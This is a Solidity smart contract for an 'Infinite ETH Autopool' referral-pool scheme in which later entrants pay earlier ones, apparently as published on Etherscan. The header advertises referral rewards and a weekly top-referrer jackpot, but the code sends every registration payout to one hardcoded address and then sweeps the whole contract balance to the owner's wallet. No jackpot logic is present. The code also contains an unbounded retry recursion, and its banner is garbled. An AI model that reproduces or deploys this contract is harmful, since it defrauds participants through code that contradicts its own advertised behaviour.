/**
 *Submitted for verification at Etherscan.io on 2020-07-14
*/

/**
 *    �����[�������[   �����[���������������[�����[�������[   �����[�����[�����������������[�����[   �����[�������������[  �������������[  �������������[ �����[     
 *    �����U���������[  �����U�����X�T�T�T�T�a�����U���������[  �����U�����U�^�T�T�����X�T�T�a�^�����[ �����X�a�����X�T�T�����[�����X�T�T�T�����[�����X�T�T�T�����[�����U     
 *    �����U�����X�����[ �����U�����������[  �����U�����X�����[ �����U�����U   �����U    �^���������X�a �������������X�a�����U   �����U�����U   �����U�����U     
 *    �����U�����U�^�����[�����U�����X�T�T�a  �����U�����U�^�����[�����U�����U   �����U     �^�����X�a  �����X�T�T�T�a �����U   �����U�����U   �����U�����U     
 *    �����U�����U �^���������U�����U     �����U�����U �^���������U�����U   �����U      �����U   �����U     �^�������������X�a�^�������������X�a���������������[
 *    �^�T�a�^�T�a  �^�T�T�T�a�^�T�a     �^�T�a�^�T�a  �^�T�T�T�a�^�T�a   �^�T�a      �^�T�a   �^�T�a      �^�T�T�T�T�T�a  �^�T�T�T�T�T�a �^�T�T�T�T�T�T�a
 *                                                                                             
 *                                                                                             
 *          Infinite ETH Autopool Smart Contract     
 * 
 *          Infinitypool.tech                                                                                   
 *          https://t.me/infinitypoolchat                                                                                   
 *                                                                                             
 *          Fresh Weekly pools and a wekly top referrer jackpot                                                                                   
 *                                                                                             
 */





pragma solidity 0.5.11 - 0.6.4;

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
    
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
      return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}


contract Autopool {
  using SafeMath for *;
  address public ownerWallet;
  uint public currUserID = 0;
  uint public pool1currUserID = 0;
  uint public pool2currUserID = 0;
  uint public pool3currUserID = 0;
  uint public pool4currUserID = 0;
  uint public pool5currUserID = 0;
  uint public pool6currUserID = 0;
  uint public pool7currUserID = 0;
  uint public pool8currUserID = 0;
  uint public pool9currUserID = 0;
  uint public pool10currUserID = 0;
           
  uint public pool1activeUserID = 0;
  uint public pool2activeUserID = 0;
  uint public pool3activeUserID = 0;
  uint public pool4activeUserID = 0;
  uint public pool5activeUserID = 0;
  uint public pool6activeUserID = 0;
  uint public pool7activeUserID = 0;
  uint public pool8activeUserID = 0;
  uint public pool9activeUserID = 0;
  uint public pool10activeUserID = 0;
      
  struct Account {
    address referrer;
    uint256 joinCount;
    uint256 referredCount;
    uint256 depositTotal;
    uint256 joinDate;
    uint256 withdrawHis;
    uint256 currentCReward;
    uint256 currentCUpdatetime;
    uint256 championReward;
    uint256 cWithdrawTime;
    uint256 isAdminAccount;
  }
    
  struct DailyRound {
    uint256 startTime;
    uint256 endTime;
    address player; 
    uint256 referredCount; //Number of referrals
    uint256 pool; //amount in the pool;
  }
      
  mapping (address => Account) public accounts;

  struct PlayerDailyRounds {
    uint256 referredCount; // total referrals user has in a particular round
  }
  uint public unlimited_level_price=0;
     
  struct UserStruct {
    bool isExist;
    uint id;
    uint referrerID;
    uint referredUsers;
    mapping(uint => uint) levelExpired;
  }
    
  struct PoolUserStruct {
    bool isExist;
    uint id;
    uint payment_received; 
  }
    
  mapping (address => UserStruct) public users;
  mapping (uint => address) public userList;
     
  mapping (address => PoolUserStruct) public pool1users;
  mapping (uint => address) public pool1userList;

  mapping (address => PoolUserStruct) public pool2users;
  mapping (uint => address) public pool2userList;

  mapping (address => PoolUserStruct) public pool3users;
  mapping (uint => address) public pool3userList;

  mapping (address => PoolUserStruct) public pool4users;
  mapping (uint => address) public pool4userList;

  mapping (address => PoolUserStruct) public pool5users;
  mapping (uint => address) public pool5userList;

  mapping (address => PoolUserStruct) public pool6users;
  mapping (uint => address) public pool6userList;

  mapping (address => PoolUserStruct) public pool7users;
  mapping (uint => address) public pool7userList;

  mapping (address => PoolUserStruct) public pool8users;
  mapping (uint => address) public pool8userList;

  mapping (address => PoolUserStruct) public pool9users;
  mapping (uint => address) public pool9userList;

  mapping (address => PoolUserStruct) public pool10users;
  mapping (uint => address) public pool10userList;



  mapping(uint => uint) public LEVEL_PRICE;

  uint REGESTRATION_FESS=0.1 ether;
  uint pool1_price=0.1 ether;
  uint pool2_price=0.2 ether ;
  uint pool3_price=0.3 ether;
  uint pool4_price=0.5 ether;
  uint pool5_price=0.65 ether;
  uint pool6_price=1 ether;
  uint pool7_price=2 ether ;
  uint pool8_price=3 ether;
  uint pool9_price=5 ether;
  uint pool10_price=10 ether;
   
   
  event regLevelEvent(address indexed _user, address indexed _referrer, uint _time);
  event getMoneyForLevelEvent(address indexed _user, address indexed _referral, uint _level, uint _time);
  event regPoolEntry(address indexed _user,uint _level,   uint _time);
  event getPoolPayment(address indexed _user,address indexed _receiver, uint _level, uint _time);
   
  UserStruct[] public requests;
     
  constructor() public {
    ownerWallet = msg.sender;
    LEVEL_PRICE[1] = 0.05 ether;
/*        
    unlimited_level_price=0 ether;
*/
    UserStruct memory userStruct;
    currUserID++;

    userStruct = UserStruct({
      isExist: true,
      id: currUserID,
      referrerID: 0,
      referredUsers:0 
    });
        
    users[ownerWallet] = userStruct;
    userList[currUserID] = ownerWallet;
          
    PoolUserStruct memory pooluserStruct;
        
    pool1currUserID++;

    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool1currUserID,
      payment_received:0
    });

    pool1activeUserID=pool1currUserID;
    pool1users[msg.sender] = pooluserStruct;
    pool1userList[pool1currUserID]=msg.sender;
          
    pool2currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool2currUserID,
      payment_received:0
    });
    pool2activeUserID=pool2currUserID;
    pool2users[msg.sender] = pooluserStruct;
    pool2userList[pool2currUserID]=msg.sender;
       
       
    pool3currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool3currUserID,
      payment_received:0
    });
    pool3activeUserID=pool3currUserID;
    pool3users[msg.sender] = pooluserStruct;
    pool3userList[pool3currUserID]=msg.sender;
       
       
    pool4currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool4currUserID,
      payment_received:0
    });
    pool4activeUserID=pool4currUserID;
    pool4users[msg.sender] = pooluserStruct;
    pool4userList[pool4currUserID]=msg.sender;

        
    pool5currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool5currUserID,
      payment_received:0
    });

    pool5activeUserID=pool5currUserID;
    pool5users[msg.sender] = pooluserStruct;
    pool5userList[pool5currUserID]=msg.sender;
       
 
    pool6currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool6currUserID,
      payment_received:0
    });
    pool6activeUserID=pool6currUserID;
    pool6users[msg.sender] = pooluserStruct;
    pool6userList[pool6currUserID]=msg.sender;
       
    pool7currUserID++;
    pooluserStruct = PoolUserStruct({
        isExist:true,
        id:pool7currUserID,
        payment_received:0
    });
    pool7activeUserID=pool7currUserID;
    pool7users[msg.sender] = pooluserStruct;
    pool7userList[pool7currUserID]=msg.sender;
       
    pool8currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool8currUserID,
      payment_received:0
    });
    pool8activeUserID=pool8currUserID;
    pool8users[msg.sender] = pooluserStruct;
    pool8userList[pool8currUserID]=msg.sender;
       
    pool9currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool9currUserID,
      payment_received:0
    });
    pool9activeUserID=pool9currUserID;
    pool9users[msg.sender] = pooluserStruct;
    pool9userList[pool9currUserID]=msg.sender;
       
       
    pool10currUserID++;
    pooluserStruct = PoolUserStruct({
      isExist:true,
      id:pool10currUserID,
      payment_received:0
    });
    pool10activeUserID=pool10currUserID;
    pool10users[msg.sender] = pooluserStruct;
    pool10userList[pool10currUserID]=msg.sender;       
  }
     
  function regUser(uint _referrerID) public payable {
    require(!users[msg.sender].isExist, "User Exists");
    require(_referrerID > 0 && _referrerID <= currUserID, 'Incorrect referral ID');
    require(msg.value == REGESTRATION_FESS, 'Incorrect Value');
       
    UserStruct memory userStruct;
    currUserID++;
    userAddresses.push(msg.sender);

    userStruct = UserStruct({
      isExist: true,
      id: currUserID,
      referrerID: _referrerID,
      referredUsers:0
    });
   
    
    users[msg.sender] = userStruct;
    userList[currUserID]=msg.sender;

    users[userList[users[msg.sender].referrerID]].referredUsers=users[userList[users[msg.sender].referrerID]].referredUsers+1;
           
    accounts[userList[users[msg.sender].referrerID]].referredCount=accounts[userList[users[msg.sender].referrerID]].referredCount.add(1);

         

    payReferral(1,msg.sender);
    emit regLevelEvent(msg.sender, userList[_referrerID], now);
  }
   
   
  function payReferral(uint _level, address _user) internal {
    address referer;       
    referer = 0x4E4595CC259b075941c7f9D0D05e87f8D133804b;
    bool sent = false;
    uint level_price_local = 0;

    if(_level > 1){
      level_price_local=unlimited_level_price;
    }
    else {
      level_price_local = LEVEL_PRICE[_level];
    }
    
    sent = address(uint160(referer)).send(level_price_local);

    if (sent) {
      emit getMoneyForLevelEvent(referer, msg.sender, _level, now);
      if(_level < 1 && users[referer].referrerID >= 1){
        payReferral(_level+1, referer);
      } else{
        sendBalance();
      }
    } else {
      //  emit lostMoneyForLevelEvent(referer, msg.sender, _level, now);
        payReferral(_level, referer);
    }
  }
   
   
   
  function buyPool1() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool1users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool1_price, 'Incorrect Value');
    PoolUserStruct memory userStruct;
    address pool1Currentuser=pool1userList[pool1activeUserID];
    pool1currUserID++;

    userStruct = PoolUserStruct({
      isExist:true,
      id:pool1currUserID,
      payment_received:0
    });
   
    pool1users[msg.sender] = userStruct;
    pool1userList[pool1currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool1Currentuser)).send(pool1_price);

    if (sent) {
      pool1users[pool1Currentuser].payment_received+=1;
      if(pool1users[pool1Currentuser].payment_received>=2){
        pool1activeUserID+=1;
      }
      emit getPoolPayment(msg.sender,pool1Currentuser, 1, now);
    }
    emit regPoolEntry(msg.sender, 1, now);
  }
    
    
  function buyPool2() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool2users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool2_price, 'Incorrect Value');

    PoolUserStruct memory userStruct;
    address pool2Currentuser=pool2userList[pool2activeUserID];
        
    pool2currUserID++;
    userStruct = PoolUserStruct({
      isExist:true,
      id:pool2currUserID,
      payment_received:0
    });
    pool2users[msg.sender] = userStruct;
    pool2userList[pool2currUserID]=msg.sender;
  
    bool sent = false;
    sent = address(uint160(pool2Currentuser)).send(pool2_price);
            
    if (sent) {
      pool2users[pool2Currentuser].payment_received+=1;
      if(pool2users[pool2Currentuser].payment_received>=3){
          pool2activeUserID+=1;
      }
      emit getPoolPayment(msg.sender,pool2Currentuser, 2, now);
    }
    emit regPoolEntry(msg.sender,2,  now);
  }
    
    
  function buyPool3() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool3users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool3_price, 'Incorrect Value');

    PoolUserStruct memory userStruct;
    address pool3Currentuser=pool3userList[pool3activeUserID];

    pool3currUserID++;
    userStruct = PoolUserStruct({
      isExist:true,
      id:pool3currUserID,
      payment_received:0
    });
    pool3users[msg.sender] = userStruct;
    pool3userList[pool3currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool3Currentuser)).send(pool3_price);

    if (sent) {
      pool3users[pool3Currentuser].payment_received+=1;
      if(pool3users[pool3Currentuser].payment_received>=3){
          pool3activeUserID+=1;
      }
      emit getPoolPayment(msg.sender,pool3Currentuser, 3, now);
    }
    emit regPoolEntry(msg.sender,3,  now);
  }
    
    
  function buyPool4() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool4users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool4_price, 'Incorrect Value');
    
    PoolUserStruct memory userStruct;
    address pool4Currentuser=pool4userList[pool4activeUserID];
    pool4currUserID++;
    userStruct = PoolUserStruct({
        isExist:true,
        id:pool4currUserID,
        payment_received:0
    });
    pool4users[msg.sender] = userStruct;
    pool4userList[pool4currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool4Currentuser)).send(pool4_price);

    if (sent) {
      pool4users[pool4Currentuser].payment_received+=1;
      if(pool4users[pool4Currentuser].payment_received>=3){
        pool4activeUserID+=1;
      }
      emit getPoolPayment(msg.sender,pool4Currentuser, 4, now);
    }
    emit regPoolEntry(msg.sender,4, now);
  }
    
    
    
  function buyPool5() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool5users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool5_price, 'Incorrect Value');
    
      
    PoolUserStruct memory userStruct;
    address pool5Currentuser=pool5userList[pool5activeUserID];  
    pool5currUserID++;
    userStruct = PoolUserStruct({
      isExist:true,
      id:pool5currUserID,
      payment_received:0
    });
    pool5users[msg.sender] = userStruct;
    pool5userList[pool5currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool5Currentuser)).send(pool5_price);

    if (sent) {
      pool5users[pool5Currentuser].payment_received+=1;
      if(pool5users[pool5Currentuser].payment_received>=3){
        pool5activeUserID+=1;
      }
      emit getPoolPayment(msg.sender,pool5Currentuser, 5, now);
    }
    emit regPoolEntry(msg.sender,5,  now);
  }
    
  function buyPool6() public payable {
    require(!pool6users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool6_price, 'Incorrect Value');

    PoolUserStruct memory userStruct;
    address pool6Currentuser=pool6userList[pool6activeUserID];

    pool6currUserID++;
    userStruct = PoolUserStruct({
      isExist:true,
      id:pool6currUserID,
      payment_received:0
    });
    pool6users[msg.sender] = userStruct;
    pool6userList[pool6currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool6Currentuser)).send(pool6_price);

    if (sent) {
      pool6users[pool6Currentuser].payment_received+=1;
      if(pool6users[pool6Currentuser].payment_received>=3) {
        pool6activeUserID+=1;
      }
      emit getPoolPayment(msg.sender,pool6Currentuser, 6, now);
    }
    emit regPoolEntry(msg.sender,6,  now);
  }
    
  function buyPool7() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool7users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool7_price, 'Incorrect Value');

    PoolUserStruct memory userStruct;
    address pool7Currentuser=pool7userList[pool7activeUserID];

    pool7currUserID++;
    userStruct = PoolUserStruct({
      isExist:true,
      id:pool7currUserID,
      payment_received:0
    });
    pool7users[msg.sender] = userStruct;
    pool7userList[pool7currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool7Currentuser)).send(pool7_price);

    if (sent) {
      pool7users[pool7Currentuser].payment_received += 1;
      if(pool7users[pool7Currentuser].payment_received >= 3) {
          pool7activeUserID += 1;
      }
      emit getPoolPayment(msg.sender,pool7Currentuser, 7, now);
    }
    emit regPoolEntry(msg.sender,7,  now);
  }
    
    
  function buyPool8() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool8users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool8_price, 'Incorrect Value');

    PoolUserStruct memory userStruct;
    address pool8Currentuser=pool8userList[pool8activeUserID];

    pool8currUserID++;
    userStruct = PoolUserStruct({
      isExist:true,
      id:pool8currUserID,
      payment_received:0
    });
    pool8users[msg.sender] = userStruct;
    pool8userList[pool8currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool8Currentuser)).send(pool8_price);

    if (sent) {
      pool8users[pool8Currentuser].payment_received += 1;
      if(pool8users[pool8Currentuser].payment_received >= 3) {
        pool8activeUserID +=1 ;
      }
      emit getPoolPayment(msg.sender,pool8Currentuser, 8, now);
    }
    emit regPoolEntry(msg.sender,8,  now);
  }
    
  function buyPool9() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool9users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool9_price, 'Incorrect Value');

    PoolUserStruct memory userStruct;
    address pool9Currentuser=pool9userList[pool9activeUserID];

    pool9currUserID++;
    userStruct = PoolUserStruct({
        isExist:true,
        id:pool9currUserID,
        payment_received:0
    });
    pool9users[msg.sender] = userStruct;
    pool9userList[pool9currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool9Currentuser)).send(pool9_price);

    if (sent) {
      pool9users[pool9Currentuser].payment_received +=1 ;
      if(pool9users[pool9Currentuser].payment_received >=3 ){
        pool9activeUserID += 1;
      }
       emit getPoolPayment(msg.sender,pool9Currentuser, 9, now);
    }
    emit regPoolEntry(msg.sender,9,  now);
  }
    
    
  function buyPool10() public payable {
    require(users[msg.sender].isExist, "User Not Registered");
    require(!pool10users[msg.sender].isExist, "Already in AutoPool");
    require(msg.value == pool10_price, 'Incorrect Value');

    PoolUserStruct memory userStruct;
    address pool10Currentuser=pool10userList[pool10activeUserID];

    pool10currUserID++;
    userStruct = PoolUserStruct({
      isExist:true,
      id:pool10currUserID,
      payment_received:0
    });
    pool10users[msg.sender] = userStruct;
    pool10userList[pool10currUserID]=msg.sender;
    bool sent = false;
    sent = address(uint160(pool10Currentuser)).send(pool10_price);
    if (sent) {
      pool10users[pool10Currentuser].payment_received += 1;
      if(pool10users[pool10Currentuser].payment_received >= 3) {
        pool10activeUserID += 1;
      }
       emit getPoolPayment(msg.sender,pool10Currentuser, 10, now);
    }
    emit regPoolEntry(msg.sender, 10, now);
  }
    
    
    
  function getEthBalance() public view returns(uint) {
    return address(this).balance;
  }
    
  function sendBalance() private {
    if (!address(uint160(ownerWallet)).send(getEthBalance())) { }
  }
    
  address [] public userAddresses;
    
  function getTopReferralAddress() public view returns (address){
    uint maxReferredUsers = 0;
    address theAddress = ownerWallet;
    
    for(uint i = 0; i < userAddresses.length; i++){
      address thisAddress = userAddresses[i];
      uint thisReferredUsers = users[thisAddress].referredUsers;
      if(thisReferredUsers > maxReferredUsers){
        maxReferredUsers = thisReferredUsers;
        theAddress = thisAddress;
      }
    }
    return theAddress;
  }
   
}